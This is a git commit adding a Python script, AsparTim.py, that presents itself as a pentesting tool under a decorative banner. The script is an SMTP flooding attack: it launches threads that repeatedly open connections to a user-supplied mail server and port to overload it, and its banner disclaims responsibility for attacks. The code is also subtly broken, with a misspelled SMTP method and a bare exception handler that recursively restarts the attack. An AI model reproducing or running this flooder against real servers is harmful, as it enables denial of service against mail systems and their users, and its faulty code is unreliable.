7b8a6fded8bb601521883cb0b9c196ce8cd753ba
bossy0 <36817786+bossy0@users.noreply.github.com>
2018-08-22 23:09:14 +0300

    Create AsparTim.py

---
+++ AsparTim.py
@@ -0,0 +1,74 @@
+#!/usr/bin/python3
+import smtplib,sys,time,os,random
+from threading import Thread
+color = random.choice(["\033[31m","\033[32m","\033[33m","\033[34m","\033[35m","\033[36m"])
+print("\033[32m                     \033[40m ___                                         ___ \033[49m")
+print("\033[31m                     \033[40m|/         |||||||||||||  ||| ||||||  |||  |||  |\033[49m")
+print("\033[32m                     \033[40m|         ||     |||=||| ||| ||||||  ||| |||    |\033[49m")
+print("\033[33m                     \033[40m|        |||||  ||||||      |||     |||||       |\033[49m")
+print("\033[34m                     \033[40m|       ||     ||||||  ||| ||||||  |||||        |\033[49m")
+print("\033[35m                     \033[40m|      ||     ||| ||| |||    |||  ||| |||       |\033[49m")
+print("\033[36m                     \033[40m|     ||     |||  |||||| ||||||  |||  |||       |\033[49m")
+print("\033[31m                     \033[40m|___ ||     |||  |||||| ||||||  |||  |||     ___|\033[49m")
+print("\033[40m\033[31m")
+print("\033[40m\033[33m[\033[36m---\033[33m]\033[36m                    <|coder alex~ndlovu(R007B07) |>                    \033[33m[\033[36m---\033[33m]\033[49m")
+print("\033[40m\033[33m[\033[36m---\033[33m]\033[36m                    <|pwn3ds3cur17y |>                                 \033[33m[\033[36m---\033[33m]\033[49m")
+print("\033[40m\033[33m[\033[36m---\033[33m]\033[36m                    <|twitter:@adroid_root_bot |>                      \033[33m[\033[36m---\033[33m]\033[49m")
+print("\033[40m\033[33m[\033[36m---\033[33m]\033[36m                    <|perpose:pentesting |>                            \033[33m[\033[36m---\033[33m]\033[49m")
+print("\033[40m\033[33m[\033[36m---\033[33m]\033[36m                    <|codename:clay |>                                 \033[33m[\033[36m---\033[33m]\033[49m")
+print("\033[40m\033[33m[\033[36m---\033[33m]\033[36m                    <|Made For Pentester/Security Res. |>              \033[33m[\033[36m---\033[33m]\033[49m")
+print("\033[40m\033[33m[\033[36m---\033[33m]\033[36m                    <|think before you frisk |>                        \033[33m[\033[36m---\033[33m]\033[49m")
+print("\033[40m\033[33m[\033[36m---\033[33m]\033[36m                    <|version v2.0 |>                                  \033[33m[\033[36m---\033[33m]\033[49m")
+print("\033[40m\033[33m[\033[36m---\033[33m]\033[36m                    <|Not Responsable ForAny Attacks |>                \033[33m[\033[36m---\033[33m]\033[49m")
+print("\033[40m\033[33m[\033[36m---\033[33m]\033[36m                    <|No System/Server Is Safe |>                      \033[33m[\033[36m---\033[33m]\033[49m")
+print("\033[40m\033[33m[\033[36m---\033[33m]\033[36m                    <|  Ctrl + Z To Stop Attack |>                     \033[33m[\033[36m---\033[33m]\033[49m")
+print("")
+print("\033[40m\033[32m[---]                <(OUR SITE IS CURRENTLY UNDER FRISK ATTACK)>           [---]\033[49m")
+print(color)
+time.sleep(2)
+try:
+	os.system("clear")
+except:
+	os.system("cls")
+def attack(host, port):
+ #Print The Server And Port Creads
+ try:
+     for x in range(int(sys.argv[3])):
+        #We Wait for 1 Sec
+        time.sleep(1)
+        #This Is Where We Request SMTP
+        s = smtplib.SMTP(host, port)
+        #Phase 2
+        s.elho()
+        #If Phase To Was A Success This Means Server Uses SMTP
+        s.starttls()
+        #We Tell The Client That The Server Rejected Which Means That It uses SMTP
+        print("- Server Rejected Frisk Packet",time.ctime(),"".format(host, port))
+ except:
+     attack(sys.argv[1],sys.argv[2])
+def Main():
+    try:
+        for alex in range(int(sys.argv[3])):
+            f1 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
+            f2 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
+            f3 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
+            f4 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
+            f5 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
+            f1.start()
+            f2.start()
+            f3.start()
+            f4.start()
+            f5.start()
+    except RuntimeError as error:
+        print(time.ctime(),"+ SENT FRISK CURRENTLY ATTACKING".format(sys.argv[1], sys.argv[2]))
+if __name__ == "__main__":
+   # while True:
+    #    try:
+     #       while True:
+      #          main()
+       # except:
+        #        main()
+    Main()
+
+
+
